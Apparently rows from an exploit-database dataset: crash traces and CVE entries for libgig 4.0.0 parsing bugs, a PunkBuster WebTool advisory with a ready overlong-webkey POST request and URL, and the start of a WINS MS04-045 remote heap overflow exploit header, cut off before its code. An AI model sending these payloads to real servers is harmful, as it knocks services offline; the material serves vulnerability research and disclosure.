0x00007ffff7bb8b4f <+2159>:mov    $0x1,%edx ... (gdb) i r rax            0x60e0506348880 rbx            0x1420 rcx            0x7ffff7669760140737344083808 rdx            0xfe254 rsi            0x2f736c6f6f742f633419195767971393379 rdi            0x22 rbp            0x00x0 rsp            0x7fffffffd8600x7fffffffd860 r8             0x60dbc06347712 r9             0x4064 r10            0x7fffffffd9f0140737488345584 r11            0x7ffff7bbf601140737349678593 r12            0x44 r13            0x60d7706346608 r14            0x60c3a06341536 r15            0x60c3a06341536 rip            0x7ffff7bb8b440x7ffff7bb8b44 <gig::DimensionRegion::CreateVelocityTable(gig::curve_type_t, unsigned char, unsigned char)+2148> eflags         0x10246[ PF ZF IF RF ] cs             0x3351 ss             0x2b43 ds             0x00 es             0x00 ---Type <return> to continue, or q <return> to quit--- fs             0x00 gs             0x00 (gdb) x/20x $rsi+0x8 0x2f736c6f6f742f6b:Cannot access memory at address 0x2f736c6f6f742f6b (gdb)  0x2f736c6f6f742f6f:Cannot access memory at address 0x2f736c6f6f742f6f (gdb)   ==40504== ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffc9ca05fa0 at pc 0x7fbea070c58b bp 0x7ffc9ca051c0 sp 0x7ffc9ca051b8 READ of size 8 at 0x7ffc9ca05fa0 thread T0     #0 0x7fbea070c58a in gig::DimensionRegion::CreateVelocityTable(gig::curve_type_t, unsigned char, unsigned char) /home/a/Documents/libgig-4.0.0/src/gig.cpp:2881     #1 0x7fbea0743964 in gig::DimensionRegion::GetVelocityTable(gig::curve_type_t, unsigned char, unsigned char) /home/a/Documents/libgig-4.0.0/src/gig.cpp:2054     #2 0x7fbea0747739 in gig::DimensionRegion::DimensionRegion(gig::Region*, RIFF::List*) /home/a/Documents/libgig-4.0.0/src/gig.cpp:1617     #3 0x7fbea074bfda in gig::Region::LoadDimensionRegions(RIFF::List*) /home/a/Documents/libgig-4.0.0/src/gig.cpp:3075     #4 0x7fbea074c7d7 in gig::Region::Region(gig::Instrument*, RIFF::List*) /home/a/Documents/libgig-4.0.0/src/gig.cpp:2923     #5 0x7fbea074ef4a in gig::Instrument::Instrument(gig::File*, RIFF::List*, RIFF::progress_t*) /home/a/Documents/libgig-4.0.0/src/gig.cpp:4404     #6 0x7fbea0750fdc in gig::File::LoadInstruments(RIFF::progress_t*) /home/a/Documents/libgig-4.0.0/src/gig.cpp:5576     #7 0x7fbea07226a0 in gig::File::GetFirstInstrument() /home/a/Documents/libgig-4.0.0/src/gig.cpp:5378     #8 0x40fca6 in PrintInstruments(gig::File*) /home/a/Documents/libgig-4.0.0/src/tools/gigdump.cpp:205     #9 0x4027aa in main /home/a/Documents/libgig-4.0.0/src/tools/gigdump.cpp:79     #10 0x7fbe9fd70ec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)     #11 0x402e5c in _start (/home/a/Documents/libgig-4.0.0/src/tools/.libs/gigdump+0x402e5c) Address 0x7ffc9ca05fa0 is located at offset 144 in frame <PrintInstruments> of T0's stack:   This frame has 2 object(s):     [32, 40) 'name'     [96, 104) 'name' HINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext       (longjmp and C++ exceptions *are* supported) SUMMARY: AddressSanitizer: stack-buffer-overflow /home/a/Documents/libgig-4.0.0/src/gig.cpp:2877 gig::DimensionRegion::CreateVelocityTable(gig::curve_type_t, unsigned char, unsigned char) Shadow bytes around the buggy address:   0x100013938ba0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x100013938bb0: 00 00 00 00 00 00 00 00 f1 f1 f1 f1 00 00 00 00   0x100013938bc0: f3 f3 f3 f3 00 00 00 00 00 00 00 00 00 00 00 00   0x100013938bd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x100013938be0: 00 00 f1 f1 f1 f1 00 f4 f4 f4 f2 f2 f2 f2 00 f4 =>0x100013938bf0: f4 f4 f3 f3[f3]f3 00 00 00 00 00 00 00 00 00 00   0x100013938c00: 00 00 f1 f1 f1 f1 00 00 f4 f4 f3 f3 f3 f3 00 00   0x100013938c10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x100013938c20: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x100013938c30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x100013938c40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes):   Addressable:           00   Partially addressable: 01 02 03 04 05 06 07    Heap left redzone:     fa   Heap righ redzone:     fb   Freed Heap region:     fd   Stack left redzone:    f1   Stack mid redzone:     f2   Stack right redzone:   f3   Stack partial redzone: f4   Stack after return:    f5   Stack use after scope: f8   Global redzone:        f9   Global init order:     f6   Poisoned by user:      f7   ASan internal:         fe ==40504== ABORTING   POC: libgig_4.0.0_stack_buffer_overflow.gig CVE: CVE-2017-12951   3. the LoadString function in helper.h in libgig 4.0.0 can cause a denial of service(Null pointer dereference and application crash) via a crafted gig file.   ./gigdump libgig_4.0.0_null_pointer_dereference_2.gig   ----debug info:---- Program received signal SIGSEGV, Segmentation fault. LoadString (s="""", ck=0x6095d0) at helper.h:148 148            if (str[len] == '\0') break; (gdb) bt #0  LoadString (s="""", ck=0x6095d0) at helper.h:148 #1  DLS::Info::LoadString (ChunkID=ChunkID@entry=1146241865,      lstINFO=lstINFO@entry=0x609330, s="""") at DLS.cpp:307 #2  0x00007ffff7ba8095 in DLS::Info::Info (this=0x609220, list=<optimized out>)     at DLS.cpp:263 #3  0x00007ffff7ba8448 in DLS::Resource::Resource (this=this@entry=0x609160,      Parent=Parent@entry=0x0, lstResource=lstResource@entry=0x609090)     at DLS.cpp:448 #4  0x00007ffff7baaa02 in DLS::File::File (this=0x609160, pRIFF=0x609090)     at DLS.cpp:1435 #5  0x00007ffff7bbab2e in gig::File::File (this=0x609160,      pRIFF=<optimized out>) at gig.cpp:5201 #6  0x0000000000401ee4 in main (argc=<optimized out>, argv=<optimized out>)     at gigdump.cpp:70 (gdb) disassemble  Dump of assembler code for function DLS::Info::LoadString(unsigned int, RIFF::List*, std::string&):    0x00007ffff7ba7f30 <+0>:push   %rbp    0x00007ffff7ba7f31 <+1>:mov    %edi,%eax    0x00007ffff7ba7f33 <+3>:mov    %rsi,%rdi    0x00007ffff7ba7f36 <+6>:mov    %eax,%esi    0x00007ffff7ba7f38 <+8>:push   %rbx    0x00007ffff7ba7f39 <+9>:mov    %rdx,%rbx    0x00007ffff7ba7f3c <+12>:sub    $0x8,%rsp    0x00007ffff7ba7f40 <+16>:callq  0x7ffff7b9ed80 <_ZN4RIFF4List11GetSubChunkEj@plt>    0x00007ffff7ba7f45 <+21>:test   %rax,%rax    0x00007ffff7ba7f48 <+24>:mov    %rax,%rbp    0x00007ffff7ba7f4b <+27>:je     0x7ffff7ba7fa8 <DLS::Info::LoadString(unsigned int, RIFF::List*, std::string&)+120>    0x00007ffff7ba7f4d <+29>:mov    %rax,%rdi    0x00007ffff7ba7f50 <+32>:callq  0x7ffff7b9e3e0 <_ZN4RIFF5Chunk13LoadChunkDataEv@plt>    0x00007ffff7ba7f55 <+37>:mov    0xc(%rbp),%r10d    0x00007ffff7ba7f59 <+41>:mov    %rax,%rsi    0x00007ffff7ba7f5c <+44>:test   %r10d,%r10d    0x00007ffff7ba7f5f <+47>:jle    0x7ffff7ba7faf <DLS::Info::LoadString(unsigned int, RIFF::List*, std::string&)+127> ---Type <return> to continue, or q <return> to quit--- => 0x00007ffff7ba7f61 <+49>:cmpb   $0x0,(%rax)    0x00007ffff7ba7f64 <+52>:je     0x7ffff7ba7faf <DLS::Info::LoadString(unsigned int, RIFF::List*, std::string&)+127>    0x00007ffff7ba7f66 <+54>:mov    $0x1,%r9d    0x00007ffff7ba7f6c <+60>:xor    %ecx,%ecx    0x00007ffff7ba7f6e <+62>:jmp    0x7ffff7ba7f7e <DLS::Info::LoadString(unsigned int, RIFF::List*, std::string&)+78>    0x00007ffff7ba7f70 <+64>:cmpb   $0x0,(%rsi,%r9,1)    0x00007ffff7ba7f75 <+69>:lea    0x1(%r9),%r8    0x00007ffff7ba7f79 <+73>:je     0x7ffff7ba7fa0 <DLS::Info::LoadString(unsigned int, RIFF::List*, std::string&)+112>    0x00007ffff7ba7f7b <+75>:mov    %r8,%r9    0x00007ffff7ba7f7e <+78>:add    $0x1,%ecx    0x00007ffff7ba7f81 <+81>:cmp    %r10d,%ecx    0x00007ffff7ba7f84 <+84>:jne    0x7ffff7ba7f70 <DLS::Info::LoadString(unsigned int, RIFF::List*, std::string&)+64>    0x00007ffff7ba7f86 <+86>:movslq %ecx,%rdx    0x00007ffff7ba7f89 <+89>:mov    %rbx,%rdi    0x00007ffff7ba7f8c <+92>:callq  0x7ffff7b9f030 <_ZNSs6assignEPKcm@plt>    0x00007ffff7ba7f91 <+97>:add    $0x8,%rsp    0x00007ffff7ba7f95 <+101>:mov    %rbp,%rdi    0x00007ffff7ba7f98 <+104>:pop    %rbx    0x00007ffff7ba7f99 <+105>:pop    %rbp ---Type <return> to continue, or q <return> to quit---q Quit (gdb) i r rax            0x00 rbx            0x6092386328888 rcx            0x7ffff739f9f7140737341159927 rdx            0x7ffff5d9f000140737318088704 rsi            0x00 rdi            0x7ffff5d9f000140737318088704 rbp            0x6095d00x6095d0 rsp            0x7fffffffdd800x7fffffffdd80 r8             0xffffffff4294967295 r9             0x00 r10            0x100001a16777242 r11            0x247583 r12            0x6092206328864 r13            0x7fffffffdfa0140737488347040 r14            0x00 r15            0x6091a06328736 rip            0x7ffff7ba7f610x7ffff7ba7f61 <DLS::Info::LoadString(unsigned int, RIFF::List*, std::string&)+49> eflags         0x10202[ IF RF ] cs             0x3351 ss             0x2b43 ds             0x00 es             0x00 ---Type <return> to continue, or q <return> to quit--- fs             0x00 gs             0x00 (gdb)   ASAN:SIGSEGV ================================================================= ==41244== ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x7f260c0db52b sp 0x7fffc62477e0 bp 0x600e0000ded0 T0) AddressSanitizer can not provide additional info.     #0 0x7f260c0db52a in LoadString /home/a/Documents/libgig-4.0.0/src/helper.h:148     #1 0x7f260c0db52a in DLS::Info::LoadString(unsigned int, RIFF::List*, std::string&) /home/a/Documents/libgig-4.0.0/src/DLS.cpp:307     #2 0x7f260c0dbfcb in DLS::Info::Info(RIFF::List*) /home/a/Documents/libgig-4.0.0/src/DLS.cpp:263     #3 0x7f260c0dcf82 in DLS::Resource::Resource(DLS::Resource*, RIFF::List*) /home/a/Documents/libgig-4.0.0/src/DLS.cpp:448     #4 0x7f260c0ee958 in DLS::File::File(RIFF::File*) /home/a/Documents/libgig-4.0.0/src/DLS.cpp:1435     #5 0x7f260c173e75 in gig::File::File(RIFF::File*) /home/a/Documents/libgig-4.0.0/src/gig.cpp:5201     #6 0x40275a in main /home/a/Documents/libgig-4.0.0/src/tools/gigdump.cpp:70     #7 0x7f260b7c3ec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)     #8 0x402e5c in _start (/home/a/Documents/libgig-4.0.0/src/tools/.libs/gigdump+0x402e5c) SUMMARY: AddressSanitizer: SEGV /home/a/Documents/libgig-4.0.0/src/helper.h:148 LoadString ==41244== ABORTING   POC: libgig_4.0.0_null_pointer_dereference_2.gig CVE: CVE-2017-12952   4. the gig::Instrument::UpdateRegionKeyTable function in gig.cpp in libgig 4.0.0 can cause a denial of service(invalid memory write and application crash) via a crafted gig file.   ./gigdump libgig_4.0.0_invalid_memory_write.gig   ----debug info:---- Program received signal SIGSEGV, Segmentation fault. gig::Instrument::UpdateRegionKeyTable (this=this@entry=0x60a1a0) at gig.cpp:4445 4445                RegionKeyTable[iKey] = pRegion; (gdb) bt #0  gig::Instrument::UpdateRegionKeyTable (this=this@entry=0x60a1a0)     at gig.cpp:4445 #1  0x00007ffff7bc0b75 in gig::Instrument::Instrument (this=0x60a1a0,      pFile=<optimized out>, insList=0x60a0c0, pProgress=0x7fffffffdd90)     at gig.cpp:4409 #2  0x00007ffff7bc103e in gig::File::LoadInstruments (this=0x609160,      pProgress=0x0) at gig.cpp:5576 #3  0x00007ffff7bbade6 in gig::File::GetFirstInstrument (     this=this@entry=0x609160) at gig.cpp:5378 #4  0x000000000040533b in PrintInstruments (gig=gig@entry=0x609160)     at gigdump.cpp:205 #5  0x0000000000401f34 in main (argc=<optimized out>, argv=<optimized out>)     at gigdump.cpp:79 (gdb) disassemble  Dump of assembler code for function gig::Instrument::UpdateRegionKeyTable():    0x00007ffff7bba240 <+0>:xor    %eax,%eax    0x00007ffff7bba242 <+2>:nopw   0x0(%rax,%rax,1)    0x00007ffff7bba248 <+8>:movq   $0x0,0x80(%rdi,%rax,1)    0x00007ffff7bba254 <+20>:add    $0x8,%rax    0x00007ffff7bba258 <+24>:cmp    $0x400,%rax    0x00007ffff7bba25e <+30>:jne    0x7ffff7bba248 <gig::Instrument::UpdateRegionKeyTable()+8>    0x00007ffff7bba260 <+32>:mov    0x60(%rdi),%r9    0x00007ffff7bba264 <+36>:mov    (%r9),%r8    0x00007ffff7bba267 <+39>:cmp    %r9,%r8    0x00007ffff7bba26a <+42>:je     0x7ffff7bba2a4 <gig::Instrument::UpdateRegionKeyTable()+100>    0x00007ffff7bba26c <+44>:nopl   0x0(%rax)    0x00007ffff7bba270 <+48>:mov    0x10(%r8),%rcx    0x00007ffff7bba274 <+52>:movzwl 0x78(%rcx),%eax    0x00007ffff7bba278 <+56>:movzwl 0x7a(%rcx),%esi    0x00007ffff7bba27c <+60>:cmp    %esi,%eax    0x00007ffff7bba27e <+62>:jg     0x7ffff7bba29a <gig::Instrument::UpdateRegionKeyTable()+90>    0x00007ffff7bba280 <+64>:add    $0x1,%esi    0x00007ffff7bba283 <+67>:nopl   0x0(%rax,%rax,1)    0x00007ffff7bba288 <+72>:movslq %eax,%rdx ---Type <return> to continue, or q <return> to quit---    0x00007ffff7bba28b <+75>:add    $0x1,%eax    0x00007ffff7bba28e <+78>:cmp    %esi,%eax => 0x00007ffff7bba290 <+80>:mov    %rcx,0x80(%rdi,%rdx,8)    0x00007ffff7bba298 <+88>:jne    0x7ffff7bba288 <gig::Instrument::UpdateRegionKeyTable()+72>    0x00007ffff7bba29a <+90>:mov    (%r8),%r8    0x00007ffff7bba29d <+93>:cmp    %r8,%r9    0x00007ffff7bba2a0 <+96>:jne    0x7ffff7bba270 <gig::Instrument::UpdateRegionKeyTable()+48>    0x00007ffff7bba2a2 <+98>:repz retq     0x00007ffff7bba2a4 <+100>:repz retq  End of assembler dump. (gdb) i r rax            0x3fbd16317 rbx            0x60a1a06332832 rcx            0x60d5806346112 rdx            0x3fbc16316 rsi            0x420116897 rdi            0x60a1a06332832 rbp            0x7fffffffdd900x7fffffffdd90 rsp            0x7fffffffdd080x7fffffffdd08 r8             0x60e7406350656 r9             0x60b0f06336752 r10            0x7fffffffdad0140737488345808 r11            0x7ffff7bba240140737349657152 r12            0x00 r13            0x60a0c06332608 r14            0x60a9806334848 r15            0x60d5806346112 rip            0x7ffff7bba2900x7ffff7bba290 <gig::Instrument::UpdateRegionKeyTable()+80> eflags         0x10283[ CF SF IF RF ] cs             0x3351 ss             0x2b43 ds             0x00 es             0x00 ---Type <return> to continue, or q <return> to quit--- fs             0x00 gs             0x00 (gdb)   ASAN:SIGSEGV ================================================================= ==43045== ERROR: AddressSanitizer: SEGV on unknown address 0x60460003dd80 (pc 0x7fb8f7cfcd88 sp 0x7ffcb179db10 bp 0x60460001f500 T0) AddressSanitizer can not provide additional info.     #0 0x7fb8f7cfcd87 in gig::Instrument::UpdateRegionKeyTable() /home/a/Documents/libgig-4.0.0/src/gig.cpp:4444     #1 0x7fb8f7d2efe2 in gig::Instrument::Instrument(gig::File*, RIFF::List*, RIFF::progress_t*) /home/a/Documents/libgig-4.0.0/src/gig.cpp:4409     #2 0x7fb8f7d30fdc in gig::File::LoadInstruments(RIFF::progress_t*) /home/a/Documents/libgig-4.0.0/src/gig.cpp:5576     #3 0x7fb8f7d026a0 in gig::File::GetFirstInstrument() /home/a/Documents/libgig-4.0.0/src/gig.cpp:5378     #4 0x40fca6 in PrintInstruments(gig::File*) /home/a/Documents/libgig-4.0.0/src/tools/gigdump.cpp:205     #5 0x4027aa in main /home/a/Documents/libgig-4.0.0/src/tools/gigdump.cpp:79     #6 0x7fb8f7350ec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)     #7 0x402e5c in _start (/home/a/Documents/libgig-4.0.0/src/tools/.libs/gigdump+0x402e5c) SUMMARY: AddressSanitizer: SEGV /home/a/Documents/libgig-4.0.0/src/gig.cpp:4445 gig::Instrument::UpdateRegionKeyTable() ==43045== ABORTING   POC: libgig_4.0.0_invalid_memory_write.gig CVE: CVE-2017-12953   5. the gig::Region::GetSampleFromWavePool function in gig.cpp in gig.cpp in libgig 4.0.0 can cause a denial of service(invalid memory read and application crash) via a crafted gig file.   ./gigdump libgig_4.0.0_invalid_memory_read.gig   ----debug info:---- Program received signal SIGSEGV, Segmentation fault. gig::Region::GetSampleFromWavePool (this=0x609160, this@entry=0x612520,      WavePoolTableIndex=0, pProgress=pProgress@entry=0x0) at gig.cpp:3849 3849        unsigned long soughtoffset = file->pWavePoolTable[WavePoolTableIndex]; (gdb) bt #0  gig::Region::GetSampleFromWavePool (this=0x609160, this@entry=0x612520,      WavePoolTableIndex=0, pProgress=pProgress@entry=0x0) at gig.cpp:3849 #1  0x00007ffff7bc07df in gig::Region::Region (this=0x612520,      pInstrument=<optimized out>, rgnList=0x6100f0) at gig.cpp:2970 #2  0x00007ffff7bc0b36 in gig::Instrument::Instrument (this=0x60ef80,      pFile=<optimized out>, insList=0x60eea0, pProgress=0x7fffffffdd90)     at gig.cpp:4404 #3  0x00007ffff7bc103e in gig::File::LoadInstruments (this=0x609160,      pProgress=0x0) at gig.cpp:5576 #4  0x00007ffff7bbade6 in gig::File::GetFirstInstrument (     this=this@entry=0x609160) at gig.cpp:5378 #5  0x000000000040533b in PrintInstruments (gig=gig@entry=0x609160)     at gigdump.cpp:205 #6  0x0000000000401f34 in main (argc=<optimized out>, argv=<optimized out>)     at gigdump.cpp:79 (gdb) disassemble  Dump of assembler code for function gig::Region::GetSampleFromWavePool(unsigned int, RIFF::progress_t*):    0x00007ffff7bbac00 <+0>:cmp    $0xffffffff,%esi    0x00007ffff7bbac03 <+3>:je     0x7ffff7bbac63 <gig::Region::GetSampleFromWavePool(unsigned int, RIFF::progress_t*)+99>    0x00007ffff7bbac05 <+5>:push   %r12    0x00007ffff7bbac07 <+7>:push   %rbp    0x00007ffff7bbac08 <+8>:push   %rbx    0x00007ffff7bbac09 <+9>:mov    0x18(%rdi),%rax    0x00007ffff7bbac0d <+13>:mov    0x18(%rax),%rbx    0x00007ffff7bbac11 <+17>:mov    0x78(%rbx),%rax    0x00007ffff7bbac15 <+21>:test   %rax,%rax    0x00007ffff7bbac18 <+24>:je     0x7ffff7bbac5c <gig::Region::GetSampleFromWavePool(unsigned int, RIFF::progress_t*)+92>    0x00007ffff7bbac1a <+26>:mov    %esi,%ecx    0x00007ffff7bbac1c <+28>:mov    %rbx,%rdi    0x00007ffff7bbac1f <+31>:mov    %rdx,%rsi => 0x00007ffff7bbac22 <+34>:mov    (%rax,%rcx,4),%ebp    0x00007ffff7bbac25 <+37>:mov    0x80(%rbx),%rax    0x00007ffff7bbac2c <+44>:mov    (%rax,%rcx,4),%r12d    0x00007ffff7bbac30 <+48>:callq  0x7ffff7b9e400 <_ZN3gig4File14GetFirstSampleEPN4RIFF10progress_tE@plt>    0x00007ffff7bbac35 <+53>:test   %rax,%rax ---Type <return> to continue, or q <return> to quit---q Quit (gdb) i r rax            0x609f806332288 rbx            0x6091606328672 rcx            0xff0000004278190080 rdx            0x00 rsi            0x00 rdi            0x6091606328672 rbp            0x00x0 rsp            0x7fffffffdc900x7fffffffdc90 r8             0x00 r9             0x22 r10            0x00 r11            0x246582 r12            0x6131906369680 r13            0x6125206366496 r14            0x00 r15            0x00 rip            0x7ffff7bbac220x7ffff7bbac22 <gig::Region::GetSampleFromWavePool(unsigned int, RIFF::progress_t*)+34> eflags         0x10202[ IF RF ] cs             0x3351 ss             0x2b43 ds             0x00 es             0x00 ---Type <return> to continue, or q <return> to quit--- fs             0x00 gs             0x00 (gdb)   ASAN:SIGSEGV ================================================================= ==44028== ERROR: AddressSanitizer: SEGV on unknown address 0x6009fc00ed70 (pc 0x7fea916446ac sp 0x7ffd026ec040 bp 0x0c08c0003ea3 T0) AddressSanitizer can not provide additional info.     #0 0x7fea916446ab in gig::Region::GetSampleFromWavePool(unsigned int, RIFF::progress_t*) /home/a/Documents/libgig-4.0.0/src/gig.cpp:3850     #1 0x7fea91670247 in gig::Region::Region(gig::Instrument*, RIFF::List*) /home/a/Documents/libgig-4.0.0/src/gig.cpp:2970     #2 0x7fea91671f4a in gig::Instrument::Instrument(gig::File*, RIFF::List*, RIFF::progress_t*) /home/a/Documents/libgig-4.0.0/src/gig.cpp:4404     #3 0x7fea91673fdc in gig::File::LoadInstruments(RIFF::progress_t*) /home/a/Documents/libgig-4.0.0/src/gig.cpp:5576     #4 0x7fea916456a0 in gig::File::GetFirstInstrument() /home/a/Documents/libgig-4.0.0/src/gig.cpp:5378     #5 0x40fca6 in PrintInstruments(gig::File*) /home/a/Documents/libgig-4.0.0/src/tools/gigdump.cpp:205     #6 0x4027aa in main /home/a/Documents/libgig-4.0.0/src/tools/gigdump.cpp:79     #7 0x7fea90c93ec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)     #8 0x402e5c in _start (/home/a/Documents/libgig-4.0.0/src/tools/.libs/gigdump+0x402e5c) SUMMARY: AddressSanitizer: SEGV /home/a/Documents/libgig-4.0.0/src/gig.cpp:3849 gig::Region::GetSampleFromWavePool(unsigned int, RIFF::progress_t*) ==44028== ABORTING   POC: libgig_4.0.0_invalid_memory_read.gig CVE: CVE-2017-12954   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42546.zip",['gig.cpp'],1
1819,"PunkBuster < 1.229 - WebTool Service Remote Buffer Overflow (Denial of Service) (PoC)                              Luigi Auriemma  ##############################################################################  Application:  PunkBuster               http://www.punkbuster.com Versions:     PunkBuster for servers, versions minor than v1.229:                 America's Army                  <= v1.228                 Battlefield 1942                <= v1.158                 Battlefield 2                   <= v1.184                 Battlefield Vietnam             <= v1.150                 Call of Duty                    <= v1.173                 Call of Duty 2                  <= v1.108                 DOOM 3                          <= v1.159                 Enemy Territory                 <= v1.167                 Far Cry                         <= v1.150                 F.E.A.R.                        <= v1.093                 Joint Operations                <= v1.187                 Quake III Arena                 <= v1.150                 Quake 4                         <= v1.181                 Rainbow Six 3: Raven Shield     <= v1.169                 Rainbow Six 4: Lockdown         <= v1.093                 Return to Castle Wolfenstein    <= v1.175                 Soldier of Fortune II           <= v1.183 Platforms:    Win32, Linux and Mac Bug:          buffer overflow in the built-in web server for the remote               server's administration (WebTool) Exploitation: remote, versus server Date:         23 May 2006 Author:       Luigi Auriemma               e-mail: aluigi@autistici.org               web:    aluigi.org  ##############################################################################  This web server is not enabled by default but must be activated selecting the TCP port on which running the service using the command: pb_sv_httpport PORT  The authentication mechanism is handled through a parameter called webkey followed by the password and sent by the client using the POST method or directly in the URL.  A webkey longer than 1024 bytes exploits a buffer-overflow which happens when the program uses the memcpy function for copying the attacker string in a limited buffer used for the comparison with the valid service's password.  The following is the code from the pbsv.dll 1.183 of the game Soldier of Fortune II where happens the exception which interrupts the game:  ... 0511B3A8   8BB424 58100000  MOV ESI,DWORD PTR SS:[ESP+1058] 0511B3AF   8D4424 18        LEA EAX,DWORD PTR SS:[ESP+18] 0511B3B3   6A 41            PUSH 41 0511B3B5   50               PUSH EAX 0511B3B6   C68424 55100000 >MOV BYTE PTR SS:[ESP+1055],0 0511B3BE   FF96 54010000    CALL DWORD PTR DS:[ESI+154] 0511B3C4   8BBC24 64100000  MOV EDI,DWORD PTR SS:[ESP+1064] ...  The ESI register is controlled by the attacker. The memcpy function described above instead is located at offset 0512aea7.  ##############################################################################  Send the following text file to the port on which is running PunkBuster  POST /pbsvweb HTTP/1.1  webkey=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbccccddddeeeeffff cmds=Command Screen  or simply build and use a link like the following:   http://127.0.0.1:80/pbsvweb/plist=1&webkey=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbccccddddeeeeffff  # milw0rm.com [2006-05-23]",['WebTool Service'],1
909,"Microsoft Windows - 'WINS' Remote Buffer Overflow (MS04-045) (3) /*                        Windows Internet Name Service (WINS)                            Remote Heap Buffer Overflow                        ------------------------------------                        ------------------------------------  Advisory credits: ----------------  		Nicolas Waisman of Immunity Inc. (www.immunitysec.com)  Advisory link: ----------------  		immunitysec.com/downloads/instantanea.pdf  Fix: ----------------  		support.microsoft.com/kb/870763 (MS04-045)  Exploit method: ----------------  		PEB (RtlEnterCriticalSection)  Tested Working: ----------------  		Win2k SP4          Server ENGLISH (should be all langages, not sure) 		Win2k SP4 Advanced Server ENGLISH (should be all langages, not sure) 		                     (KB870763 removed!)  Note: ----------------  		A HAT-SQUAD view on this hole; exploitable and remaining critic for Windows 2000. 		May need update for Windows 2003 due to the different 		structure of wins.exe in it but the bug remain exploitable 		with no KB870763 of course.... 		If you look closely at my code , you will notice two overwrites, 		this is the difference between Server <=> Advanced Server, with an 		el8 pad, repair, you catch them both.  Greetings: ----------------  		All guys at hat-squad and metasploit 		also #n3ws at EFnet, useful to keep an eye on security.. (50 rsslinks) 		and thanx you leku.  Update: ----------------  		v0.2: runtime error fixed 		v0.3: hardcoded repair, much decent and stable 		v0.3: FreeBSD compilation fixed: gcc 101_WINS.cpp -o 101_WINS                                  